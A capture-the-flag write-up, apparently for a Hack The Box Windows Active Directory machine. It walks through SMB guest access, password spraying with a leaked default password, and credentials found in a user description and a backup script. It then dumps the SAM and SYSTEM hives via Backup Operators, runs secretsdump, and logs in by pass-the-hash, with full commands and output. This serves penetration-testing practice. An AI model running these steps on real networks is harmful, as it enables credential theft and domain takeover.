---
{"dg-publish":true,"permalink":"/ct-fs/htb/cicada/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #AD #Backup_Operators #leaked_creds #descriptions #secretsdump

## Recon

![Pasted image 20261022141723.png](/img/user/CTFs/HTB/Images/Cicada%20Images/Pasted%20image%2020261022141723.png)
### Nmap:
```zsh
nmap -p53,139,135,88,389,445,464,593,636,3269,3268,5985,59472 -sV -sC -T4 -Pn -oA 10.129.231.149 10.129.231.149
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 15:49 -0400
Nmap scan report for 10.129.231.149
Host is up (0.090s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-23 02:48:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-10-23T02:49:54+00:00; +6h59m33s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-10-23T02:49:54+00:00; +6h59m33s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-10-23T02:49:54+00:00; +6h59m33s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2026-10-23T02:49:54+00:00; +6h59m33s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
59472/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-23T02:49:37
|_  start_date: N/A
|_clock-skew: mean: 6h59m32s, deviation: 0s, median: 6h59m32s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.98 seconds

```
Initial portscanning shows a common suite of Windows services including, Domain Services, Kerberos, LDAP, SMB, MSRPC, and HTTPAPI. Adding `CICADA-DC.cicada.htb` to our `/etc/hosts` file for DNS resolution.
### NetExec
#### Null & Guest Access
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada]
└─$ nxc smb CICADA-DC.cicada.htb -u '' -p '' --shares                                              
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\: 
SMB         10.129.231.149  445    CICADA-DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/cicada]
└─$ nxc smb CICADA-DC.cicada.htb -u 'Guest' -p '' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\Guest: 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server shar
```
Checking for Null and Guest access we find that Guests have read access to the `HR` share. Let's see what's inside.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada]
└─$ smbclient -U 'cicada.htb/Guest%' \\\\CICADA-DC.cicada.htb\\HR     
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

		4168447 blocks of size 4096. 482113 blocks available
smb: \> get "Notice from HR.txt"

```
Inside we find a text doc Notice from HR.

```plaintext
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
In it we see a welcome message from HR explaining that users all start with the same default password, and then proceeds to provide that password in plaintext. This may be a candidate for a password spray once we can pull a valid list of users.

#### User List Exfil
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ nxc smb CICADA-DC.cicada.htb -u 'Guest' -p '' --rid-brute --users-export users.txt
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\Guest: 
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
Abusing our Guest access with `nxc's` `--rid-brute` flag we are able to brute force a list of valid users and export them to a text file locally called `users.txt`

## Initial Access
### Password Spraying Default Credentials
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ nxc smb CICADA-DC.cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'           
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```
Password spraying our user list with the default password provided in the previous note we find that we gain successful authentication to the server as `michael.wrightson`

### Further User Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ nxc smb CICADA-DC.cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users 
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1        
SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1        
SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0
```
Using our newly compromised creds we are able to use the `--users` flag with `nxc` which queries the domain directly for the information. This also happens to include any user descriptions. As you can see one user `david.orelious` stored their plaintext password in their description.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ nxc smb CICADA-DC.cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3'        
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
```
Using NXC we do validate that the leaked password for David is valid.

### Group Enumeration (Remote Management)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ nxc ldap CICADA-DC.cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --groups "Remote Management Users"
LDAP        10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.231.149  389    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
LDAP        10.129.231.149  389    CICADA-DC        emily.oscars
```
Enumerating the members of the Remote Management Users group we see that `emily.oscars` is it's only member. This likely is our target for `user.txt` since she is the only low-priv user that has shell access on this server.

### Share Access Cont. (David)
```zsh
└─$ nxc smb CICADA-DC.cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares                                                  
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
```
Enumerating shares on our newly compromised user reveals we have read access to the `DEV` share. Let's investigate.

```zsh
┌──(kali㉿kali)-[~/…/HTB/cicada/files/bloodhound]
└─$ smbclient -U 'cicada.htb/david.orelious%aRt$Lp#7t*VQ!3' \\\\CICADA-DC.cicada.htb\\DEV
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

		4168447 blocks of size 4096. 481292 blocks available
```
Inside the share we see a file called `Backup_script.ps1`.

```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```
Inside the script we see a simple powershell script to run a backup of the `C:\smb` directory and back it up to the `D:\Backup` directory with `emily.oscars'` credentials hardcoded in plaintext.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ evil-winrm -i 10.129.231.149 -u 'emily.oscars@cicada.htb' -p 'Q!3@Lp#M6b*7t*Vt'            
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir ../Desktop


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/22/2026   7:45 PM             34 user.txt

```
Using `evil-winrm` we are able to successfully gain a session with the leaked creds for `emily.oscars` and find `user.txt` sitting on her Desktop.
### Bloodhound
#### Extraction
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ nxc ldap CICADA-DC.cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --bloodhound --collection ALL --dns-server 10.129.231.149
LDAP        10.129.231.149  389    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.231.149  389    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
LDAP        10.129.231.149  389    CICADA-DC        Resolved collection methods: group, objectprops, localadmin, trusts, dcom, acl, container, session, psremote, rdp
LDAP        10.129.231.149  389    CICADA-DC        Done in 0M 23S
LDAP        10.129.231.149  389    CICADA-DC        Compressing output into /home/kali/.nxc/logs/CICADA-DC_10.129.231.149_2026-10-22_162810_bloodhound.zip

```
We successfully extracted bloodhound loot earlier as `david.orelious` and have added his, Michael's and Emily's users as "owned objects" in `bloodhound`
#### Analysis
![Pasted image 20261022134630.png](/img/user/CTFs/HTB/Images/Cicada%20Images/Pasted%20image%2020261022134630.png)
Looking through the "shortest paths from owned objects" cypher in `bloodhound` we see that `emily.oscars` is a privileged user as a member of `Backup Operators`. 

## Privilege Escalation
### Backup Operators Abuse

```zsh
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
Manually enumerating her privileges confirms that we have the `SeBackupPrivilege` and the `SeRestorePrivilege` on the server making her user vulnerable to a secrets dump.

#### Evil-WinRM
##### Exfiltrating the SAM and SYSTEM Registry Hives
```zsh
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save HKLM\SAM  C:\Windows\Temp\SAM
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download 'C:\Windows\Temp\SAM'
                                        
Info: Downloading C:\Windows\Temp\SAM to SAM
                                        
Info: Download successful!
```
As a member of the "Backup Operators" group we can backup and restore any files on the file system including files that hold credentials stored on the SAM and SYSTEM registry hives. We start by "backing up" the SAM hive to a file called `SAM` inside `C:\Windows\Temp` but this could be any directory we have write access over. 

```zsh
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> mv C:\Windows\Temp\SYSTEM .
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir


    Directory: C:\Users\emily.oscars.CICADA\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/22/2026   8:53 PM       18558976 SYSTEM


```
```zsh
smb: \Users\emily.oscars.CICADA\Documents\> dir
  .                                  DR        0  Thu Oct 22 23:57:03 2026
  ..                                  D        0  Thu Aug 22 17:22:13 2024
  My Music                        DHSrn        0  Thu Aug 22 17:22:13 2024
  My Pictures                     DHSrn        0  Thu Aug 22 17:22:13 2024
  My Videos                       DHSrn        0  Thu Aug 22 17:22:13 2024
  SYSTEM                              A 18558976  Thu Oct 22 23:53:56 2026

		4168447 blocks of size 4096. 473356 blocks available
smb: \Users\emily.oscars.CICADA\Documents\> get SYSTEM
getting file \Users\emily.oscars.CICADA\Documents\SYSTEM of size 18558976 as SYSTEM (8520.9 KiloBytes/sec) (average 8520.9 KiloBytes/sec)

```
We do the same process for the SYSTEM registry hive. However, because the file was so large `evil-wirm` wouldn't download the file completely so I moved the registry hive to our user's Documents folder and then via `smbclient` downloaded it from there by connecting to `\\\\CICADA-DC.cicada.htb\\C$` and navigating to our user folder and then Documents.

#### Secretsdump
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/cicada/files]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 

```
Back on our local attacker machine we then use `secretsdump` from Impacket, providing each hive with the corresponding flags and the LOCAL option which tells secrets dump to enumerate these files locally. As you can see, we easily dump the NTLM hash for `Administrator`.

#### profit
```zsh
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/22/2026   7:45 PM             34 root.txt

```
We login via pass-the-hash on the DC as `Administrator` and find `root.txt` sitting on their desktop. pwned.

## Final Thoughts
>[!Takeaways]
>- Always re-enumerate users once you have valid creds for descriptions.
>- Always re-enumerate share access each time you compromise a new user
>- Always pull bloodhound loot when you can. 
>- Always check your privileges on the machine
>- When abusing Backup Operators, download the SAM and SYSTEM hives and dump them offline with secretsdump

